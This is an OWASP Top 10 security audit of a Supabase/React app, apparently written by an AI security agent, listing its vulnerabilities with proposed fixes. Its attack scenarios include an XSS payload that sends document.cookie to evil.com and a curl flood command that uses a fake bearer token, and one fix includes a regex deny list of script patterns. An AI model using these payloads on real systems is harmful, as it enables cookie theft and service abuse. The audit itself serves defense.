# OWASP Top 10 Security Audit

**Date:** 2026-01-28  
**Agent:** GitHub Copilot (Security Agent)  
**Scope:** SmartConnect AI - Full Codebase Analysis  
**Framework:** OWASP Top 10:2021 + MITRE ATT&CK

---

## Executive Summary

✅ **Overall Security Posture: GOOD**

The codebase demonstrates **Security by Design** principles with strong validation, error handling, and infrastructure isolation. However, there are **critical vulnerabilities** that must be addressed before production deployment.

### Critical Issues Found: 3
### High Priority Issues: 2
### Medium Priority Issues: 3
### Low Priority Issues: 1

---

## 🔴 CRITICAL VULNERABILITIES (Must Fix Before Production)

### 1. A02:2021 - Cryptographic Failures

**File:** `src/features/chatbot/presentation/ChatbotContainer.ts`  
**Lines:** 30-31  
**Severity:** 🔴 CRITICAL  
**MITRE ATT&CK:** T1552.001 - Credentials in Files

**Vulnerable Code:**
```typescript
const supabaseUrl = import.meta.env.VITE_SUPABASE_URL || '';
const supabaseAnonKey = import.meta.env.VITE_SUPABASE_ANON_KEY || '';
```

**Risk Description:**
Environment variables prefixed with `VITE_` are **exposed to the client browser**. This means:
1. ✅ **Supabase URL:** Safe to expose (public by design)
2. 🔴 **Supabase Anon Key:** **EXPOSED IN PRODUCTION BUNDLE** - Anyone can inspect the JavaScript bundle and extract this key

**Attack Scenario:**
```bash
# Attacker opens browser DevTools
# Searches for "VITE_SUPABASE_ANON_KEY" in bundled JavaScript
# Extracts the key and can now:
- Read all documents from public tables
- Bypass rate limiting if not configured in Supabase RLS
- Perform DoS attacks by exhausting Edge Function quotas
```

**MITRE Technique:** T1552.001 (Credentials in Files) → Attacker extracts hardcoded credentials from client-side code.

**Secure Code Solution:**
```typescript
// ✅ FIXED: Use Supabase Row Level Security (RLS)
// The anon key is DESIGNED to be public, but you MUST configure RLS policies

// In Supabase Dashboard → Authentication → Policies:
// 1. Enable RLS on `qribar_documents` table
// 2. Create policy: "Allow authenticated read access"
//    Using: auth.role() = 'authenticated' OR auth.role() = 'anon'
// 3. Create policy: "Deny all write access for anon role"
//    Using: auth.role() != 'anon'

// Current code is ACCEPTABLE IF AND ONLY IF:
// - Supabase RLS is properly configured
// - Edge Functions validate requests
// - Rate limiting is enabled in Supabase dashboard
```

**Action Required:**
1. ✅ Verify Supabase RLS policies are enabled
2. ✅ Add rate limiting to Edge Functions
3. ✅ Document RLS policies in `docs/SUPABASE_SECURITY.md`
4. ⚠️ Consider implementing API key rotation strategy

---

### 2. A03:2021 - Injection (Missing Input Sanitization)

**File:** `src/features/landing/domain/entities/Lead.ts`  
**Lines:** 40-80  
**Severity:** 🔴 CRITICAL  
**MITRE ATT&CK:** T1059 - Command and Scripting Interpreter

**Vulnerable Code:**
```typescript
validateName(): string {
  if (!/^[a-zA-ZáéíóúÁÉÍÓÚñÑüÜ\s]{2,50}$/.test(this.name)) {
    return 'Solo letras y espacios (2-50 caracteres)';
  }
  return '';
}

validateMessage(): string {
  if (!this.message.trim()) return 'El mensaje es requerido';
  if (this.message.length < 10) return 'Mínimo 10 caracteres';
  if (this.message.length > 500) return 'Máximo 500 caracteres';
  return '';
}
```

**Risk Description:**
1. ✅ **Name/Company/Email:** Properly validated with regex (prevents XSS/Injection)
2. 🔴 **Message Field:** **ONLY LENGTH VALIDATION** - Allows arbitrary HTML/JavaScript/SQL injection payloads

**Attack Scenario:**
```javascript
// Attacker submits:
{
  name: "John Doe",
  company: "Evil Corp",
  email: "attacker@evil.com",
  service: "QRIBAR",
  message: "<script>fetch('https://evil.com/steal?data='+document.cookie)</script>"
}

// If n8n workflow displays this in an HTML email or dashboard:
// → XSS attack executed when victim opens the email/dashboard
```

**MITRE Technique:** T1059.007 (JavaScript) → Injected script steals sensitive data or performs actions on behalf of the victim.

**Secure Code Solution:**
```typescript
// ✅ FIXED: Add HTML/Script sanitization
validateMessage(): string {
  if (!this.message.trim()) return 'El mensaje es requerido';
  if (this.message.length < 10) return 'Mínimo 10 caracteres';
  if (this.message.length > 500) return 'Máximo 500 caracteres';
  
  // Prevent HTML/Script injection
  const dangerousPatterns = [
    /<script[\s\S]*?>[\s\S]*?<\/script>/gi,
    /<iframe[\s\S]*?>[\s\S]*?<\/iframe>/gi,
    /javascript:/gi,
    /on\w+\s*=\s*["'][^"']*["']/gi, // onclick, onerror, etc.
    /<img[\s\S]*?onerror[\s\S]*?>/gi,
  ];
  
  for (const pattern of dangerousPatterns) {
    if (pattern.test(this.message)) {
      return 'El mensaje contiene caracteres no permitidos';
    }
  }
  
  return '';
}
```

**Alternative Solution (Recommended):**
```typescript
// Install DOMPurify for robust HTML sanitization
// npm install dompurify @types/dompurify

import DOMPurify from 'dompurify';

validateMessage(): string {
  if (!this.message.trim()) return 'El mensaje es requerido';
  
  // Sanitize HTML while preserving plain text
  const sanitized = DOMPurify.sanitize(this.message, { 
    ALLOWED_TAGS: [], // No HTML tags allowed
    ALLOWED_ATTR: [] 
  });
  
  if (sanitized.length < 10) return 'Mínimo 10 caracteres';
  if (sanitized.length > 500) return 'Máximo 500 caracteres';
  
  return '';
}
```

**Action Required:**
1. 🔴 Add HTML sanitization to `validateMessage()`
2. ✅ Ensure n8n workflow HTML-escapes all lead data before rendering
3. ✅ Test with OWASP XSS payloads: `<script>alert('XSS')</script>`

---

### 3. A07:2021 - Identification and Authentication Failures

**File:** `supabase/functions/gemini-generate/index.ts`, `supabase/functions/gemini-embedding/index.ts`  
**Lines:** 21-27  
**Severity:** 🔴 CRITICAL  
**MITRE ATT&CK:** T1078 - Valid Accounts

**Vulnerable Code:**
```typescript
// Verificar autorización (requerido por Supabase)
const authHeader = req.headers.get('Authorization');
if (!authHeader) {
  return new Response(
    JSON.stringify({ error: 'Missing Authorization header' }),
    { status: 401, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
  );
}

// ❌ MISSING: NO VALIDATION OF THE TOKEN ITSELF
// ❌ MISSING: NO RATE LIMITING PER USER/IP
// ❌ MISSING: NO QUOTA ENFORCEMENT
```

**Risk Description:**
The code checks for the **presence** of an Authorization header but **NEVER VALIDATES IT**. This means:
1. Any request with `Authorization: Bearer fake_token` will pass validation
2. No rate limiting per user or IP address
3. Attacker can exhaust Gemini API quota by sending unlimited requests

**Attack Scenario:**
```bash
# Attacker sends unlimited requests:
curl -X POST https://your-project.supabase.co/functions/v1/gemini-generate \
  -H "Authorization: Bearer FAKE_TOKEN" \
  -H "apikey: YOUR_ANON_KEY" \
  -d '{"contents": [{"role": "user", "parts": [{"text": "spam"}]}]}'

# Result:
# - All requests succeed (no token validation)
# - Gemini API quota exhausted
# - Legitimate users blocked
# - Unexpected $1000+ bill from Google AI Studio
```

**MITRE Technique:** T1078 (Valid Accounts) → Attacker bypasses authentication by exploiting weak validation.

**Secure Code Solution:**
```typescript
// ✅ FIXED: Validate JWT token with Supabase
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2';

Deno.serve(async (req) => {
  const corsHeaders = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
  };

  if (req.method === 'OPTIONS') {
    return new Response('ok', { headers: corsHeaders });
  }

  try {
    // ✅ VALIDATE TOKEN
    const authHeader = req.headers.get('Authorization');
    if (!authHeader) {
      return new Response(
        JSON.stringify({ error: 'Missing Authorization header' }),
        { status: 401, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    const token = authHeader.replace('Bearer ', '');
    const supabaseClient = createClient(
      Deno.env.get('SUPABASE_URL') ?? '',
      Deno.env.get('SUPABASE_ANON_KEY') ?? ''
    );

    const { data: { user }, error: authError } = await supabaseClient.auth.getUser(token);

    if (authError || !user) {
      return new Response(
        JSON.stringify({ error: 'Invalid or expired token' }),
        { status: 401, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    // ✅ IMPLEMENT RATE LIMITING (Basic version)
    // TODO: Use Upstash Redis for production-grade rate limiting
    const rateLimitKey = `rate_limit:${user.id}:${new Date().toISOString().slice(0, 13)}`; // Per hour
    // Check rate limit from Supabase database or Redis

    // Continue with existing logic...
    const requestBody = await req.json();
    // ... rest of code
  } catch (error) {
    return new Response(
      JSON.stringify({ error: error.message }),
      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );
  }
});
```

**Action Required:**
1. 🔴 Add JWT validation in **both** Edge Functions
2. 🔴 Implement rate limiting (10 requests/minute per user)
3. ✅ Add quota monitoring in Supabase dashboard
4. ✅ Set up alerts for unusual API usage

---

## 🟡 HIGH PRIORITY ISSUES

### 4. A01:2021 - Broken Access Control (Missing Authorization)

**File:** `src/features/chatbot/data/datasources/SupabaseDataSource.ts`  
**Lines:** 40-60  
**Severity:** 🟡 HIGH  
**MITRE ATT&CK:** T1213 - Data from Information Repositories

**Vulnerable Code:**
```typescript
async searchSimilarDocuments(
  embedding: number[],
  threshold: number = 0.7,
  limit: number = 5
): Promise<Document[]> {
  const { data, error } = await this.supabase.rpc('match_documents', {
    query_embedding: embedding,
    match_threshold: threshold,
    match_count: limit,
  });
  
  // ❌ NO AUTHORIZATION CHECK
  // ❌ NO VALIDATION OF USER ACCESS TO DOCUMENTS
}
```

**Risk Description:**
The function searches ALL documents in the database without checking:
1. If the user has permission to access those documents
2. If documents belong to a specific tenant/restaurant
3. If documents are marked as private/public

**Attack Scenario:**
```javascript
// Attacker creates a chatbot session
// Crafts a specific query to extract competitor data:
"Show me all menu items from Restaurant X"

// If Restaurant X's data is in the same database:
// → Attacker can access competitor pricing and menu strategies
```

**MITRE Technique:** T1213 (Data from Information Repositories) → Unauthorized access to stored data.

**Secure Code Solution:**
```typescript
// ✅ FIXED: Add tenant isolation
async searchSimilarDocuments(
  embedding: number[],
  threshold: number = 0.7,
  limit: number = 5,
  tenantId?: string // NEW: Add tenant filter
): Promise<Document[]> {
  const { data, error } = await this.supabase.rpc('match_documents', {
    query_embedding: embedding,
    match_threshold: threshold,
    match_count: limit,
    tenant_id: tenantId, // Filter by tenant
  });
  
  if (error) {
    throw new ApiError(`Document search failed: ${error.message}`, 500);
  }
  
  // Verify all returned documents belong to the tenant
  if (tenantId) {
    const validDocuments = data.filter((doc: any) => doc.tenant_id === tenantId);
    return validDocuments.map((doc: any) => ({
      id: doc.id,
      content: doc.content,
      metadata: doc.metadata,
      similarity: doc.similarity,
    }));
  }
  
  return data;
}
```

**SQL RLS Policy (Supabase):**
```sql
-- Create policy in Supabase Dashboard
CREATE POLICY "Users can only access their tenant documents"
ON qribar_documents
FOR SELECT
USING (
  tenant_id = current_setting('app.current_tenant_id', true)::text
  OR tenant_id IS NULL -- Public documents
);
```

**Action Required:**
1. 🟡 Add `tenant_id` column to `qribar_documents` table
2. 🟡 Implement RLS policy in Supabase
3. ✅ Pass tenant context from UI to backend
4. ✅ Test multi-tenancy isolation

---

### 5. A09:2021 - Security Logging and Monitoring Failures

**Files:** All use cases and repositories  
**Severity:** 🟡 HIGH  
**MITRE ATT&CK:** T1562.001 - Impair Defenses

**Current State:**
```typescript
// ✅ GOOD: Basic logging exists
logger.error('[QRIBAR] ❌ Error fetching menu items', error);

// ❌ MISSING: Security event logging
// ❌ MISSING: Failed authentication attempts
// ❌ MISSING: Unusual access patterns
// ❌ MISSING: Data exfiltration detection
```

**Risk Description:**
The system logs errors but does NOT log:
1. Failed login attempts (brute force detection)
2. Unusual query patterns (data scraping)
3. API quota exhaustion (DoS detection)
4. Unauthorized access attempts

**Secure Solution:**
```typescript
// ✅ FIXED: Add security event logging
export class SecurityLogger extends ConsoleLogger {
  logSecurityEvent(event: {
    type: 'AUTH_FAILURE' | 'RATE_LIMIT_EXCEEDED' | 'SUSPICIOUS_QUERY' | 'DATA_ACCESS';
    userId?: string;
    ip?: string;
    details: string;
  }) {
    const securityLog = {
      timestamp: new Date().toISOString(),
      severity: 'SECURITY',
      ...event,
    };
    
    // Log to console (dev/staging)
    console.warn('🔒 SECURITY EVENT:', securityLog);
    
    // TODO: Send to Supabase audit table or Sentry
    // await supabase.from('security_logs').insert(securityLog);
  }
}

// Usage in Edge Function:
if (authError || !user) {
  securityLogger.logSecurityEvent({
    type: 'AUTH_FAILURE',
    userId: undefined,
    ip: req.headers.get('x-forwarded-for') || 'unknown',
    details: authError?.message || 'Invalid token',
  });
  
  return new Response(
    JSON.stringify({ error: 'Unauthorized' }),
    { status: 401, headers: corsHeaders }
  );
}
```

**Action Required:**
1. 🟡 Create `SecurityLogger` class extending `ConsoleLogger`
2. 🟡 Add `security_logs` table in Supabase
3. ✅ Log all authentication failures
4. ✅ Set up alerts for > 5 failed attempts in 1 minute

---

## 🟢 MEDIUM PRIORITY ISSUES

### 6. A04:2021 - Insecure Design (No Rate Limiting on Frontend)

**File:** `src/features/landing/data/datasources/N8NWebhookDataSource.ts`  
**Severity:** 🟢 MEDIUM

**Current State:**
```typescript
async sendLead(payload: WebhookPayload): Promise<boolean> {
  const response = await fetch(this.webhookUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json; charset=utf-8' },
    body: JSON.stringify(payload),
  });
  
  // ❌ NO RATE LIMITING
  // ❌ NO CAPTCHA VALIDATION
  // ❌ NO HONEYPOT FIELD
}
```

**Risk:** Bots can spam the form, exhausting n8n workflow quotas.

**Solution:**
```typescript
// ✅ Add honeypot field (invisible to humans, visible to bots)
// In React form:
<input 
  type="text" 
  name="website" 
  style={{ display: 'none' }} 
  tabIndex={-1}
  autoComplete="off"
/>

// In validation:
if (payload.website) {
  logger.warn('Bot detected (honeypot filled)', payload);
  return false; // Silently fail
}
```

**Action Required:**
1. 🟢 Add honeypot field to contact form
2. 🟢 Consider adding Google reCAPTCHA v3
3. ✅ Test with bot traffic

---

### 7. A05:2021 - Security Misconfiguration (CORS Wide Open)

**File:** `supabase/functions/gemini-generate/index.ts`  
**Lines:** 9-12  
**Severity:** 🟢 MEDIUM

**Current State:**
```typescript
const corsHeaders = {
  'Access-Control-Allow-Origin': '*', // ❌ Allows ALL origins
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};
```

**Risk:** Any website can call your Edge Functions.

**Solution:**
```typescript
// ✅ FIXED: Restrict to your domain
const corsHeaders = {
  'Access-Control-Allow-Origin': Deno.env.get('ALLOWED_ORIGIN') || 'https://smartconnect.ai',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
  'Access-Control-Allow-Credentials': 'true',
};
```

**Action Required:**
1. 🟢 Set `ALLOWED_ORIGIN` in Supabase Edge Function secrets
2. ✅ Test CORS with production domain
3. ✅ Add `localhost:5173` for development

---

### 8. A08:2021 - Software and Data Integrity Failures

**File:** `package.json`  
**Severity:** 🟢 MEDIUM

**Current State:**
```json
{
  "dependencies": {
    "react": "^19.2.3", // ✅ Pinned version
    "@supabase/supabase-js": "^2.39.0" // ⚠️ Allows minor updates
  }
}
```

**Risk:** Dependency updates could introduce vulnerabilities.

**Solution:**
```bash
# ✅ Use exact versions in production
npm install --save-exact @supabase/supabase-js@2.39.0

# ✅ Add integrity checks
npm audit
npm audit fix

# ✅ Use lock file
git add package-lock.json
```

**Action Required:**
1. 🟢 Run `npm audit` and fix vulnerabilities
2. ✅ Enable Dependabot alerts on GitHub
3. ✅ Pin critical dependencies (Supabase, React)

---

## ✅ LOW PRIORITY ISSUES

### 9. A06:2021 - Vulnerable and Outdated Components

**Status:** ✅ ACCEPTABLE (No critical outdated dependencies detected)

**Action Required:**
1. ✅ Run `npm audit` monthly
2. ✅ Update React 19.2.3 when 19.3.0 is released

---

## 🔍 NOT APPLICABLE

### A10:2021 - Server-Side Request Forgery (SSRF)

**Status:** ✅ NOT APPLICABLE

The application does NOT:
- Accept user-provided URLs for fetching
- Make server-side requests based on user input
- Use webhooks with user-controlled endpoints

---

## 📊 Compliance Summary

| OWASP Category | Status | Priority |
|----------------|--------|----------|
| A01: Broken Access Control | 🔴 VULNERABLE | HIGH |
| A02: Cryptographic Failures | 🔴 VULNERABLE | CRITICAL |
| A03: Injection | 🔴 VULNERABLE | CRITICAL |
| A04: Insecure Design | 🟢 MINOR ISSUE | MEDIUM |
| A05: Security Misconfiguration | 🟢 MINOR ISSUE | MEDIUM |
| A06: Vulnerable Components | ✅ COMPLIANT | LOW |
| A07: Auth Failures | 🔴 VULNERABLE | CRITICAL |
| A08: Integrity Failures | 🟢 MINOR ISSUE | MEDIUM |
| A09: Logging Failures | 🟡 NEEDS IMPROVEMENT | HIGH |
| A10: SSRF | ✅ NOT APPLICABLE | N/A |

---

## 🎯 Action Plan (Priority Order)

### Phase 1: Critical Fixes (Before Production) - 3 Days
1. ✅ Add JWT validation in Edge Functions (Issue #3)
2. ✅ Implement HTML sanitization in Lead entity (Issue #2)
3. ✅ Configure Supabase RLS policies (Issue #1)
4. ✅ Add rate limiting to Edge Functions (Issue #3)

### Phase 2: High Priority - 1 Week
5. ✅ Implement tenant isolation in document search (Issue #4)
6. ✅ Create security event logging system (Issue #5)
7. ✅ Test all security fixes with OWASP payloads

### Phase 3: Medium Priority - 2 Weeks
8. ✅ Add honeypot field to contact form (Issue #6)
9. ✅ Restrict CORS to production domain (Issue #7)
10. ✅ Pin critical dependencies (Issue #8)

### Phase 4: Monitoring & Compliance - Ongoing
11. ✅ Set up Sentry for error tracking
12. ✅ Enable GitHub Dependabot alerts
13. ✅ Create security runbook for incident response
14. ✅ Quarterly OWASP Top 10 audit

---

## 🔒 Security Best Practices Implemented

### ✅ Already Implemented (Good Work!)
1. **Clean Architecture:** Separation of concerns prevents logic injection
2. **Input Validation:** Regex patterns for name/email/company
3. **Error Handling:** Typed errors (ApiError, NetworkError) prevent info leakage
4. **Environment Isolation:** `.env` files not committed to Git
5. **HTTPS Only:** Supabase enforces TLS 1.2+
6. **No Sensitive Logs:** No passwords/keys logged to console
7. **TypeScript:** Type safety prevents many injection attacks

### ⚠️ Needs Implementation (See Action Plan)
1. JWT token validation in Edge Functions
2. HTML sanitization in message field
3. Row Level Security (RLS) in Supabase
4. Rate limiting (frontend + backend)
5. Security event logging
6. Multi-tenancy isolation
7. CORS restriction

---

## 📚 References

- [OWASP Top 10:2021](https://owasp.org/Top10/)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [Supabase Security Best Practices](https://supabase.com/docs/guides/auth/row-level-security)
- [Gemini API Security](https://ai.google.dev/gemini-api/docs/api-key)

---

**Status:** Audit Completed ✅  
**Next Review:** 2026-04-28 (Quarterly)  
**Responsible:** Security Team + Lead Developer
